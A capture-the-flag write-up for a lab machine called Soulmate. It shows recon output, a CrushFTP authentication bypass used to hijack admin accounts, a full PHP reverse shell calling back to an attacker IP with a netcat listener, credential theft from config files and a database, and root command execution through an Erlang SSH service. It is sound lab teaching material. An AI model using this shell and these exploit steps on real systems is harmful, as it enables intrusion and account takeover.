# Soulmate 

## Recon

```
nmap -A -p- -T4 10.129.4.153 -oN nmap_scan
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 22:45 IST
Nmap scan report for 10.129.4.153
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   360.40 ms 10.10.14.1
2   360.73 ms 10.129.4.153
```

- On visiting the page, we find the domain name soulmate.htb. Add it to /etc/hosts.
```
echo '10.129.231.23 soulmate.htb | sudo tee -a /etc/hosts'
```
- The page is about finding your soulmate. I registered an account and logged in to the site. 
- The site using php for the backend. And there is a file upload functionality. 
- I tried lots of techniques, but nothing worked. 
- After a while i performed subdomain enumeration and found a sub.

```
ffuf -u http://soulmate.htb/ -H "Host: FUZZ.soulmate.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -fw 4


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 260ms]
:: Progress: [4989/4989] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```
- Lets add it to our /etc/hosts file
```
echo '10.129.231.23 ftp.soulmate.htb' | sudo tee -a /etc/hosts
```

- paste the URL in the browser 
```
http://ftp.soulmate.htb
```
- There, we can find a CrushFTP login page.
- After googling, I found that CrushFTP is vulnerable to authentication bypass. [CVE-2025-31161](https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks)

- And there is a Python script available for this CVE on [exploitDB](https://www.exploit-db.com/exploits/52295?source=post_page-----d39779c9ee1c---------------------------------------)

- You can check the version of our CrushFTP from the web page source code.
```
.register("/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52")
```
- version 11.W.657

- Let's check whether the application is vulnerable or not.

```
 python3 auth_bypass.py --target ftp.soulmate.htb --check --port 80


[36m          
  / ____/______  _______/ /_  / ____/ /_____ 
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
                                    /_/      
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Scanning 1 targets with 10 threads...
Scanning targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Scan complete! Found 1 vulnerable targets.

Summary:
Total targets: 1
Vulnerable targets: 1
Exploited targets: 0
```
- See, it says vulnerable targets: 1
- Now Exploit the target
```
python3 auth_bypass.py --target ftp.soulmate.htb --exploit --new-user spider --password password@123 --port 80

[36m          
  / ____/______  _______/ /_  / ____/ /_____ 
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
                                    /_/      
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user spider on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```
- Now that we have added a user of our own choice, we can log in using the credentials 
- Well! intially i created a user spider, and I logged in. Then I find an admin interface. I tried to access the admin interface, but it didn't work don't know why. So I reset ppassword for the default admin **crushadmin**. and logged in. 
```
python3 auth_bypass.py --target ftp.soulmate.htb --exploit --new-user crushadmin --password password@123 --port 80

[36m          
  / ____/______  _______/ /_  / ____/ /_____ 
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
                                    /_/      
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user crushadmin on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```
- After logging in to the admin panel, we can see other users. I resent ben user's password. 
- Ha has access to the webProd directory, which is our http://soulmate.htb site . 
- I uploaded a php shell to that directory.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.248';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
```
nc -lnvp 1234
```
- After that, access the URL http://soulmate.htb/shell.php
- Bhoom! Got a shell as www-data

- I navigate to var/www/soulmate.htb there I find a config file.
- From the config file, I find a soulmate.db file 
- In that file, i find the  admin password hash.

```
www-data@soulmate:~/soulmate.htb/data$ ls
soulmate.db
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
sqlite> 
```

- Admin hash
```
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
```
- This is nothing but the soulmate admin user. You can find the clear-text password in the config file.
```
  if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
```

- On further enumeration i found a couple of listening ports 
```
www-data@soulmate:~/soulmate.htb/config$ netstat -alt
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:9090          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:2222          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:8443          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:43031         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:epmd          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:43275         0.0.0.0:*               LISTEN   
```

- On port 2222, a ssh service is running
```
www-data@soulmate:~/soulmate.htb/config$ nc localhost 2222
SSH-2.0-Erlang/5.2.9
```

```
ps -aux | grep erlang
root        1143  0.0  1.7 2252808 68496 ?       Ssl  14:00   0:01 /usr/local/lib/erlang_login/start.escript -B -- -roo
t /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no
_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local
/lib/erlang_login/start.escript
www-data    3163  0.0  0.0   6828  2172 pts/0    S+   16:49   0:00 grep erlang
```
- The script for the service is located on **/usr/local/lib/erlang_login/start.escript**
```
cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

- Found hardcoded ssh creds for user Ben.
- ssh to Ben.
```
ben@soulmate.htb
```
**user.txt: df6b3d90109b8ba4f807d1834efd2cc6**

## Root access

- The service **SSH-2.0-Erlang/5.2.9** is vulnerable to [RCE](https://github.com/platsecurity/CVE-2025-32433/tree/main)
- Read this [article](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce)

- If the above exploit is successful, it writes a file to the root directory.
- And it worked. We can find a file, lab.txt, under the root directory. which means the service is vulnerable.
- since I already have ssh creds of ben i loged in to the ssh service on port 2222.

```
ssh ben@localhost -p 2222
```
- We can execute commands using os:cmd("<command>").

```
(ssh_runner@soulmate)3> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

```
(ssh_runner@soulmate)4> os:cmd("cat /root/root.txt").
"76570d7d88a2b8e9b4f02b1c43a78404\n"
```

**Root.txt: 76570d7d88a2b8e9b4f02b1c43a78404**
